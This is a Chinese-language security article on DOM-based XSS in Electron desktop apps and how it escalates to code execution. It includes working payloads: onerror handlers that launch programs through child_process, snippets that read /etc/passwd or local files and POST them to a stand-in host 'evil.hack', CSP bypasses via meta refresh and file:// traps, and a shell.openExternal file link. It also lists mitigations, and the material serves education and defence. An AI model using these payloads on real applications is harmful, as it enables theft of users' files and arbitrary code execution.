作者：[二向箔安全](https://mp.weixin.qq.com/s/DgjJ6uKtuUPFQhgztL69RQ)

基于 Electron 的 XSS 攻击实例，远比你想象的简单。

#### 什么是 Electron

也许你从未听说过跨平台 XSS，也从未听说过 Electron， 但你肯定知道 GitHub，或者使用过著名的 Atom 编辑器，
比如正在尝试翻译这篇文章的笔者，正在使用 Atom 来编写 Markdown。 Electron 优秀的跨平台特性，是本文的基础。

简单来说，Electron 是一个框架，用于方便开发者创建跨平台应用。 开发者可以通过它来使用 HTML + JavaScript 来开发桌面应用。
Electron 的用户非常广泛，因为它确实可以为不同平台提供同样的体验。

与传统观念的所谓“桌面应用”不同， Electron 应用包括两个部分（Node.js 和 Chromium）作为运行环境。
分别支持一个主进程和一个渲染进程， 其中，主进程是一个非常 Node.js 风格的进程， 而渲染进程是一个可以运行 Node.js 代码的 Chromium
内核浏览器。

由上文我们得知，Electron 应用是非常特殊的， 它本身是一个二进制应用，而渲染进程则是一个浏览器， 而 Electron
自身又具有很多的特性，所以，我们将从三个方面分析。

我们已知 Electron 的渲染进程是由 Chromium + Node.js 构成， 那么我们可以从分析传统 Web 应用的角度，得出这样的结论：

  * DOM 操作非常多、非常频繁
  * 基于 DOM 的 XSS 会变得很容易发生
  * 可以完成基于 JavaScript 的自由重定向（重定向至不可信站点）

所以，使用传统的 Web 应用分析套路来处理 Electron 是十分必要的。

#### 什么是 DOM-Based XSS

众所周知，DOM-Based XSS 的频发主要是因为 DOM 相关处理不当。 DOM-Based XSS 是因未经转义的用户输入被直接生成为 HTML
而产生。 一般而言，随着 DOM 操作的增多，DOM-Based XSS 发生的概率也会大大提高。 下面是两段 Electron 应用存在 DOM-Based XSS 的示例代码：

    
    
    // Demo 1
    fs.readFile( filename, (err,data) => {
      if(!err) element.innerHTML = data; //XSS!
    });
    
    // Demo 2
    fs.readdir( dirname, (err,files) => {
      files.forEach( (filename) => {
        let elm = document.createElement( "div" );
        elm.innerHTML = `<a href='${filename}'>${filename}</a>`; //XSS!
        paerntElm.appendChild( elm );
        });
    });

对于 Electron 应用而言，一旦 DOM-Based XSS 发生将是灾难性的。 原因是：Node.js 在很多情况下是可以被攻击者进行代码注入的！
除此之外，一般观念里的 XSS = ALERT 在这里是不适用的。

XSS 还有诸多玩法：

  * 读写本地文件
  * 以任何协议进行通信
  * 通过接口与其他进程通信
  * 随意地启动其他程序（启动其他进程）

也就是说，通过 DOM-Based XSS 可能被用于执行二进制代码。 在后文中，我们将详细地研究在 Electron 中的 DOM-Based XSS。

#### 与传统的 XSS 的不同之处

现在我们进行一个对比， 对比传统的 Web 应用中的 XSS、浏览器沙盒中的 XSS 和 Electron 中的 XSS。

##### 传统的 Web 应用中的 XSS

  * 显示虚假信息、泄露 Cookie、泄露网站内信息……
  * 所有 JavaScript 在『在网站内』能做的事
  * 除了『网站内』的，啥都不能做

##### 被浏览器沙盒保护中的 XSS

  * 即使存在 XSS，对除了 XSS 所在网站的其他站点没有影响
  * 站点可以为自己存在的 XSS 承担责任，不影响其他人

##### 在 Electron 中的 XSS

  * 可以以当前用户权限启动任意代码
  * 所有用户能做的事情，Electron 中的 XSS 都可以做
  * 可以超过存在 XSS 的应用本身产生影响

#### 深入分析 Electron 中的 DOM-Based XSS

传统的 XSS 危害

  * 弹窗（ALERT）
  * 显示假消息（比如插入一个『请输入密码』的文本框）
  * 打 Cookie（核心功能）
  * 盗取敏感信息（读取密码框内容等）
  * 其它……

Electron 的 DOM-Based XSS 使任意代码执行变为可能。 这意味着，DOM-Based XSS 获得了如同缓冲区溢出的攻击效果。

与传统的 DOM-Based XSS 相比，Electron 中的 DOM-Based：

  * 攻击向量选择更加多样，甚至可以与 HTTP 无关
  * HTML 生成数量少且不复杂，往往不会有非常多的依赖

因此，Electron 中的 DOM 操作必须更精细，严格转义是必要的。(渲染进程中可以使用 Node 函数) 基于这个特性，攻击者可以在此之中插入
Node 函数用于攻击， 比如，这是一个普通的 XSS 实例：

    
    
    // xss_source 是攻击者可以控制的字符串
    elm.innerHTML = xss_source; // XSS!

攻击者可以以下面的方式利用：

    
    
    // 弹计算器
    <img src=# onerror="require('child_process').exec('calc.exe',null);">
    // 读取本地文件并发送
    <img src=# onerror="let s = require('fs').readFileSync('/etc/passwd','utf-8');
    fetch('http://evil.hack/', { method:'POST', body:s });">

很多开发者使用 CSP 来限制 XSS 带来的影响， 那么这种方法是否适用于 Electron 的 DOM-Based XSS 呢？
答案是否定的。下面我们将通过几个例子来讲解。

    
    
    <!-- 这是一个渲染器中的示例，可以看到 CSP 设置 -->
    <head>
    <meta http-equiv="Content-Security-Policy" content="default-src 'none';script-src 'self'">
    </head>
    <body>
    <script src="./index.js"></script>
    </body>

在这种情况下，我们可以通过meta refresh来穿过 CSP：

    
    
    // 这是 index.js 中的内容
    elm.innerHTML = xss_source; // XSS!
    // 这是我们对 xss_source 的控制
    xss_source = '<meta http-equiv="refresh" content="0;http://evil.hack/">';
    // 这是 evil.hack 中的<script>脚本内容
    require('child_process').exec('calc.exe',null);

以上过程成功地弹出了计算器。也就是说，Node 语句依然有效。 下面，我们介绍另一种思路，依然是先看一个示例：

    
    
    <!-- 这是一个渲染器中的示例，可以看到 CSP 设置 -->
    <head>
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'">
    </head>
    <body>
    <iframe id="iframe"></iframe>
    <script src="./index.js"></script>
    </body>
    
    // index.js
    iframe.setAttribute("src", xss_source); // XSS!
    // 这是 main.js 的节选
    win = new BrowserWindow({width:600, height:400});
    win.loadURL(`file://${__dirname}/index.html`);

在这种情况下，我们可以构建：

    
    
    xss_source = 'file://remote-server/share/trap.html';
    // 下面是 trap.html 中的脚本
    window.top.location=`data:text/html,<script>require('child_process').exec('calc.exe',null);<\/script>`;

此方法依然成功的绕过了 CSP 限制， 原因是在 `main.js` 中的 `file://` 与 `trap.html` 中的 `file://`
被认为是同源的。

#### 私有 API 与架构的安全风险

接下来要内容是分析 Electron 自身带有的丰富的 API、函数和标签带来的安全问题。

##### 私有 API

  * 标签
  * shell.openExternal 等

##### Electron 的架构问题

  * 浏览器窗口默认支持加载file://
  * 并没有与普通浏览器一般的地址栏

##### 本地文件信息窃取

我们发现在默认情况下，Node 语句是可用的。 但是，如果开发者禁用了 Node 语句：

    
    
    // main.js 节选
    win = new BrowserWindow({ webPreferences:{nodeIntegration:false} });
    win.loadURL(`file://${__dirname}/index.html`);

这种情况下，我们注入的 Node 语句不生效，可造成的威胁降低了。 看起来，在创建 BrowserWindow 的时候禁用 Node 语句是必要的。
但是，如果 Node 语句被禁用，Electron 会变得很鸡肋。

如果开发者执意禁止 Node 语句，我们依然不是无计可施的。 以刚刚的 main.js 为例，我们可以通过xhr来做更多的事情。

    
    
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "file://c:/file.txt", true);
    xhr.onload = () => {
      fetch("http://eveil.hack/",{method:"POST", body:xhr.responseText});
    };
    xhr.send( null );

通过上面的代码，我们可以读取本地文件并将其发送出去。 这使得开发者在牺牲 Electron 的实用性禁用 Node 语句后， XSS 依旧十分强大。

###### iframe 沙盒

iframe 的沙盒可以用于限制 DOM 操作访问沙盒内部，从而降低 XSS 威胁性， 即使是 DOM-Based XSS 在 iframe
中发生，影响也十分有限。 比如如下的情况，在外部控制 iframe 是无效的。

    
    
    <iframe sandbox="allow-same-origin" id="sb"
    srcdoc="<html><div id=msg>'test'</div>..."></iframe>
    <script>
      ...
      document.querySelector("#sb").contentDocument.querySelector("#msg").innerHTML ="Hello, XSS!<script>alert(1)<\/script>"; // not work
    </script>

下面是一些常用的 sandbox params：

  * allow-same-origin 允许作为包含文档的同源内容被处理
  * allow-scripts 允许执行脚本（危险！这意味着 JavaScript 将被正常执行）
  * allow-forms 允许提交表单
  * allow-top-navigation 允许内容被加载到顶层（危险！）
  * allow-popups 允许弹出窗口（危险！）

下面是一个启用allow-popups的例子，以此来说明影响：

    
    
    <iframe sandbox="allow-same-origin allow-popups" id="sb"
    srcdoc="<html><div id=msg'></div>..."></iframe>
    <script>
    ...
      var xss = `<a target="_blank" href="data:text/html,<script>require('child_process').exec('calc.exe',null);<\/script>">Click</a>`;
      document.querySelector("#sb").contentDocument.querySelector("#msg").innerHTML = xss;
    </script>

在这种情况下，用户一旦点击，就会弹出窗口。 根据默认可执行 Node 语句的特性，弹出计算器。

###### webview 标签的风险

webview 标签是用于在 Electron 中打开其它页面使用的。

  * 不同于 iframe，webview 没有访问 webview 外部途径
  * 不同于 iframe，webview 同样不可以被外部操作 DOM
  * 每一个 webview 都可以被单独地控制是否可以 Node 语句执行
  * 通过allowpopups属性，webview 可以弹出窗口
  * 可以使用`window.open()`、`<a target=_blank>` 等语句打开新窗口
  * 在 iframe 与 webview 中，对 Node 语句执行的控制是不同的
  * 在 iframe 中，Node 语句一直被禁止执行，而弹出的窗口可以执行
  * 在 webview 中，Node 语句默认被禁止执行，弹出的窗口同样被禁止
  * 在 webview 中，Node 语句执行被设置为允许时，弹出的窗口是允许执行的
  * webview 即使禁止了 Node 语句执行，在preload脚本中的 Node 依然是可用的。

    
    
    <webview src="http://example.jp/" preload="./prealod.js"></webview>
    
    //preload.js
    window.loadConfig = function(){
      let file = `${__dirname}/config.json`;
      let s = require("fs").readFileSync( file, "utf-8" );
      return JSON.eval( s );
    };

通常情况下，开发者会将存在的 Web App 变为一个 Native App, 然后，在 webview 中启动存在的 Web App.
在这里容易出现的问题是，开发者常常需要使用第三方服务接入此页面。

比如第三方广告、视频播放脚本等，它们具有完整能力。 比如执行任意的 JavaScript、构造假页面、污染页面等， 如果这个 webview 可以使用
Node，那就更有意思了。

    
    
    <body>
      <webview src="http://test.cn/"></webview>
      <script src="native-apps.js"></script>
    </body>

通常的应对之策也易于理解：控制第三方内容的权限，比如通过 iframe 沙盒， 但这不适用于某些嵌入式 JavaScript 广告。 对于 Web App
来说，还有地址栏这个东西，可以让用户自己确认站点是否有效；

浏览器的存在和同源策略大大限制了其影响。 但对于 Electron 来说，没有地址栏，这带来了很大的风险。 更重要的是，一旦 Node
语句被允许执行，威胁能力将大大提高。

下面我们介绍如何利用存在allowpopups设置的 webview：

    
    
    <webview src="http://test.cn/" allowpopups></webview>

攻击主要原因是在 window.open 中，`file://` 依然可用， 这使得攻击者在可以进行与前文类似的本地文件读取等操作。

    
    
    // http://test.cn
    window.open("file://remote-server/share/trap.html");
    // trap.html
    var xhr = new XMLHttpRequest();
    xhr.open( "GET", "file://C:/secret.txt", true );

解决方案很简单：

  * 关掉 allowpopups
  * 如果一定要用，就在 main.js 中进行 url 合法性检查

###### shell.openExternal 与 shell.openItem 的风险

`shell.openExternal` 与 `shell.openItem` 是 Electron 用于打开外部程序的 API。

    
    
    const {shell} = require('electron');
    const url = 'http://example.cn/';
    shell.openExternal(url); // 打开系统默认浏览器
    shell.openItem( url );
    
    let file = 'C:/Users/test/test.txt';
    shell.openExternal( file ); // 打开文件
    shell.openItem( file );
    
    let file = ''file://C:/Users/test/test.txt';';
    shell.openExternal( file ); // 打开文件
    shell.openItem( file );

常见的情况是 Electron 调用外部浏览器打开，如下：

    
    
    webview.on( 'new-window', (e) => {
      shell.openExternal( e.url ); // 系统浏览器打开
    });

此时，如何攻击者可以构造 URL 如下，则可以执行任意程序。 需要注意：此处不能传递参数。

    
    
    <a href="file://c:/windows/system32/calc.exe">Click</a>

应对之策也很简单，检查 URL 合法性即可（如匹配协议等）。

#### 结论：

  * Electron 存在 DOM-Based XSS 基本就是一死
  * Electron 随处可见的 Node 执行、外部脚本执行
  * 即使外部脚本被禁了，还可以使用file://进行有效的攻击

#### 参考：

http://utf-8.jp/cb2016/cb-hasegawa-en.pdf

* * *

**扫码关注：二向箔安全**
![](https://images.seebug.org/content/images/2017/08/-----.png-w331s)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/370/>

